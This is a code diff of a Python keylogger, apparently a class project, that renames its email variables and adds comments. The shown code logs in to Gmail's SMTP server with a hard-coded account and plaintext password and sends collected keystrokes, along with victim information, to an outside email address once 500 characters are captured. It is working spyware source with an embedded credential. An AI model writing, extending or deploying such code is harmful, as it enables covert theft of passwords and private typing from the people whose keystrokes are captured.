@@ -10,11 +10,12 @@ import socket
 import getpass
 import platform
 
-destEmail = 'keylogsenderUIUC460@gmail.com'
-dataBufferSize = 500
-hackeremail = "keylogsenderUIUC460"
-hackerpwd =  "qazwsxedcrfv"
-local = False
+destEmail = 'keylogsenderUIUC460@gmail.com' #Destination Email 
+srcEmail = "keylogsenderUIUC460" #Emails will be sent from this email account 
+srcPwd =  "qazwsxedcrfv"
+dataBufferSize = 500 #Emails will be sent out after this many characters have been collected (note "[CTRL]" is 6 chars)
+
+local = False #If this is True then keystrokes will be logged to file instead of email
 exit_key = keyboard.Key.esc
 end_program= False
 data = ""
@@ -66,10 +67,10 @@ def filterKeys(letter):
 	return replacements.get(letter,letter)
 
 def serverSetup():
-	global hackeremail, hackerpwd
+	global srcEmail, srcPwd
 	server = smtplib.SMTP('smtp.gmail.com', 587)
 	server.starttls()
-	server.login(hackeremail, hackerpwd)
+	server.login(srcEmail, srcPwd)
 	return server
 
 def send_data(msg, victimInfo):
